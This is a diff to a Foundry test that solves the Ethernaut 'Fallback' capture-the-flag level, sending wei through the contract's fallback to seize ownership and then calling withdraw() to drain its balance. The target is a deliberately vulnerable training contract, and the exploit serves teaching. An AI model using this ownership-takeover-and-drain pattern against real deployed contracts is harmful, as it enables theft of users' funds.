@@ -21,7 +21,7 @@ contract EthNautL1Solution is Test {
         vm.deal(player2, 1 ether);
 
         activeFactory = new FallbackFactory();
-        activeLevel = Fallback(payable(activeFactory.createInstance(player2)));
+        activeLevel = Fallback(payable(activeFactory.createInstance(player1)));
 
     }//function setUp() public {
 
@@ -47,9 +47,18 @@ contract EthNautL1Solution is Test {
         //└─ ← "EvmError: OutOfGas"
         //payable(address(activeLevel)).transfer(5 wei);
 
+        //use Call with empty msg.data
+        //added return value logic because i hate compiler warnings..
         (bool success, ) = address(activeLevel).call{value: 5 wei}("");
         require(success, "Compiler Warnings Bug The Sh1t Out of ME!");
 
+        //Player1 should now be the owner
         assertEq(activeLevel.owner(), address(player1));
+
+        //Lets clean the account out now we pass the `onlyOwner` access modifier
+        activeLevel.withdraw();
+
+        //check with the boss all criterea are met
+        assertEq(activeFactory.validateInstance(payable(address(activeLevel)), player1), true);
     }//function test_Exploit() public {
 }//class
